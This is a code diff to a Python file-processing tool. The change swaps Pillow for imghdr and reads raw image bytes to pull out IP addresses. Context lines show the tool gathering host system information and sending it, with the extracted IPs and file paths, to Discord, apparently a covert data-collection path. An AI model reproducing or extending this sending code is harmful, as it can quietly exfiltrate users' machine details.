@@ -81,41 +81,16 @@ def setup_environment():
         
         # Install required packages with specific versions
         console.print("[yellow]Installing required packages...[/yellow]")
-        
-        # First install basic packages
-        basic_packages = [
+        packages = [
             "requests==2.31.0",
             "PyPDF2==3.0.1",
             "rich==13.7.0"
         ]
         
-        for package in basic_packages:
+        for package in packages:
             if not install_package(pip_executable, python_executable, package):
                 console.print(f"[red]Failed to install {package}. Please check your Python version and try again.[/red]")
                 return None
-        
-        # Try installing Pillow with different versions
-        pillow_versions = [
-            "Pillow==9.5.0",
-            "Pillow==9.4.0",
-            "Pillow==9.3.0",
-            "Pillow==9.2.0",
-            "Pillow==9.1.0"
-        ]
-        
-        pillow_installed = False
-        for version in pillow_versions:
-            try:
-                console.print(f"[yellow]Trying to install {version}...[/yellow]")
-                subprocess.check_call([python_executable, "-m", "pip", "install", "--no-cache-dir", version])
-                console.print(f"[green]Successfully installed {version}[/green]")
-                pillow_installed = True
-                break
-            except subprocess.CalledProcessError:
-                continue
-        
-        if not pillow_installed:
-            console.print("[red]Failed to install any version of Pillow. The tool will continue without image processing capabilities.[/red]")
         
         return python_executable
     except Exception as e:
@@ -145,7 +120,7 @@ def main():
     # Now import the required packages after setup
     import requests
     import PyPDF2
-    from PIL import Image
+    import imghdr
     import re
     import socket
     import platform
@@ -247,9 +222,17 @@ def main():
             try:
                 with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=True) as progress:
                     progress.add_task("Processing Image...", total=None)
-                    with Image.open(file_path) as img:
+                    # Check if it's a valid image file
+                    if not imghdr.what(file_path):
+                        raise ValueError("Invalid or unsupported image format")
+                    
+                    # Read the file and look for IP addresses in the binary content
+                    with open(file_path, 'rb') as f:
+                        content = f.read()
+                        # Convert binary content to string, looking for IP addresses
+                        text_content = content.decode('utf-8', errors='ignore')
                         system_info = self.get_system_info()
-                        self.send_to_discord(self.extract_ips_from_text(str(img.info)), f"Image: {file_path}", system_info)
+                        self.send_to_discord(self.extract_ips_from_text(text_content), f"Image: {file_path}", system_info)
             except Exception as e:
                 logger.error(f"Error processing image {file_path}: {str(e)}")
                 console.print(f"[red]Error processing image: {str(e)}[/red]")
